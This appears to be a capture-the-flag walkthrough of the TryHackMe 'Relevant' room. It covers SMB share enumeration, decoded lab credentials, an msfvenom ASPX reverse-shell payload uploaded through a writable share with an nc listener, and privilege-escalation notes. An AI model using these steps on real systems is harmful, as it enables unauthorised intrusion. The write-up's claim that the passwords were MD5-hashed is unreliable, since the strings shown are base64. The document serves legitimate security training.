---
title: TryHackMe - Relevant Room Walkthrough
author: skullhat
date: '2023-06-17 00:34:00 +0800'
comments: true
categories:
  - thm
  - ctf
tags:
  - windows
  - active_directory
published: true
---
## Scope:

- The client has asked that you secure two flags (no location provided) as proof of exploitation:
	- User.txt
	- Root.txt
- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first  
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)

## Basic OS Detection

```bash
ping -c 1 10.10.97.109
PING 10.10.97.109 (10.10.97.109) 56(84) bytes of data.
64 bytes from 10.10.97.109: icmp_seq=1 ttl=127 time=285 ms
```

- Probably a Windows machine.
## Enumeration using `nmap`



## SMB:445
### Null Authentication
- Try null authentication, but getting nothing. Based on nmap output the `gust` account can access the shares.

```bash
crackmapexec smb 10.10.97.109 -u "" -p "" --shares
```

- When trying `gust` has juicy folder called nt4wrksv with read and write permissions.

```bash
crackmapexec smb 10.10.97.109 -u "gust" -p "" --shares

```


- Found `passowrds.txt` then create smb directory and move it there.

``` bash
crackmapexec smb 10.10.176.144 -u "gust" -p "" -M spider_plus
smbclient //10.10.176.144/nt4wrksv -U ""
```
- The users passwords was MD5 hashed.

> The Hash
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

> The Plain Text
Bob:!P@$$W0rD!123
Bill:Juw4nnaM4n420696969!$$$                                          


### SMB relay
- From nmap and cme the SMB signing is disable, so smb relay may work.
- Can not perform smb relay.

## Getting a shell

1. Try bill account on `evil-winrm` and can not access. Also try on RDP and failed. So it must be fake!
2. found that port 49663 has also a web server and run `gobsuter` to enumerate directories and found one with same `smb` share name! 

- http://10.10.247.115:49663/nt4wrksv/shell.aspx


``` bash
msfvenom -p windows/x64/shell_reverse_tcp LPORT=9001 LHOST=10.9.78.51  -f aspx -o shell.aspx 
smbclient //10.10.247.115/nt4wrksv -U 'bob'
smb: \> put shell.aspx
sudo rlwrap nc -lnvp 9001
```

## Local Enumeration 

``` powershell
whoami /all
systeminfo
```

## PrivEsc

- We found `SeImpersonatePrivilage` so we can run [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0) which is Abusing Impersonation Privileges From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.


- Potatoes attack is detected by the AV.
- There is a problem in kali preventing me performing Etrnalblue MS17-010
